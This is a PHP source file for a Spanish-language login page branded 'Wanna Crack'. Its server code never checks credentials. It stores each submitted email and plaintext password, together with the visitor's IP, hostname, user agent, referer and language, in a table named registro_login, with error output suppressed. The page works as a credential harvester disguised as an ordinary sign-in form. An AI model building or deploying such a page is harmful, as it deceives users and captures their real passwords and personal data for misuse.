<?php
ini_set('display_errors', 0);
error_reporting(0);

$np = 'Login';
$bodyclass = 'wcBGColor2 WCRaton';
include_once('./includes/head.php');

// Procesar datos si se envió el formulario
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $correo = $_POST['correo'] ?? '';
    $contrasena = $_POST['contrasena'] ?? '';
    $ip = $_SERVER['REMOTE_ADDR'];
    $hostname = gethostbyaddr($ip);


    // Recolectar datos adicionales del usuario
    $userData = [
        'ip' => $ip,
        'user_agent' => $_SERVER['HTTP_USER_AGENT'] ?? 'No disponible',
        'pagina_actual' => $_SERVER['REQUEST_URI'] ?? 'No disponible',
        'metodo_http' => $_SERVER['REQUEST_METHOD'] ?? 'No disponible',
        'referer' => $_SERVER['HTTP_REFERER'] ?? 'No disponible',
        'puerto' => $_SERVER['REMOTE_PORT'] ?? 'No disponible',
        'protocolo' => $_SERVER['SERVER_PROTOCOL'] ?? 'No disponible',
        'idioma' => $_SERVER['HTTP_ACCEPT_LANGUAGE'] ?? 'No disponible',
        'host' => gethostbyaddr($ip) ?? 'No disponible',
    ];

    // Convertir los datos del usuario a JSON
    $userDataJson = json_encode($userData);

    // Validar los datos
    if (filter_var($correo, FILTER_VALIDATE_EMAIL) && !empty($contrasena)) {
        include_once('./includes/bbdd.php');
        include_once("./lib/funciones_globales.php");

        $correo = sanitize_input($correo, "email");
        $contrasena = sanitize_input($contrasena, "string");
        $userDataJson = sanitize_input($userDataJson, "string");
        $hostname = sanitize_input($hostname, "string");

        // Consulta para guardar los datos
        $sql = "INSERT INTO registro_login (ip, usuario, correo, contra, datos) VALUES (?, ?, ?, ?, ?)";
        $stmt = $conn->prepare($sql);
        $stmt->bind_param("sssss", $ip, $hostname, $correo, $contrasena, $userDataJson);
        $stmt->execute();
    } else {
        $error = "Por favor, ingresa un correo válido y una contraseña.";
    }
}
?>

<div class="container d-flex justify-content-center align-items-center vh-100">
    <div class="card p-4 shadow" style="width: 100%; max-width: 400px;">
        <h3 class="text-center mb-1">Iniciar Sesión en</h3>
        <h4 class="text-center mb-4">Wanna Crack</h4>

        <!-- Mostrar mensaje de error si existe -->
        <?php if (!empty($error)) { ?>
            <div class="alert alert-danger text-center"><?php echo $error; ?></div>
        <?php } ?>

        <form method="POST" action="./index.php">
            <!-- Email input con form-floating -->
            <div class="form-floating mb-4">
                <input type="email" id="formLoginCorreo" class="form-control" placeholder="Correo electrónico" name="correo" required>
                <label for="formLoginCorreo">Correo electrónico</label>
            </div>

            <!-- Password input con form-floating -->
            <div class="form-floating mb-4">
                <input type="password" id="formLoginContrasena" class="form-control" placeholder="Contraseña" name="contrasena" required>
                <label for="formLoginContrasena">Contraseña</label>
            </div>

            <!-- Botón de inicio de sesión -->
            <button type="submit" class="btn btn-primary w-100 mb-2 wcBtnColor3">Iniciar sesión</button>
        </form>

        <!-- Divider con línea y texto "OR" en el centro -->
        <div class="d-flex align-items-center my-4">
            <hr class="flex-grow-1">
            <span class="text-center mx-3 text-muted fw-bold">o</span>
            <hr class="flex-grow-1">
        </div>

        <!-- Botón de inicio de sesión con otra opción (ejemplo de red social) -->
        <button type="button" class="btn btn-outline-secondary w-100">Iniciar sesión con SSO</button>
    </div>
</div>

<?php
function footerjs()
{
    echo "
        <script src='./assets/bootstrap/js/bootstrap.bundle.min.js'></script>
    ";
}
include_once('./includes/footer.php');
?>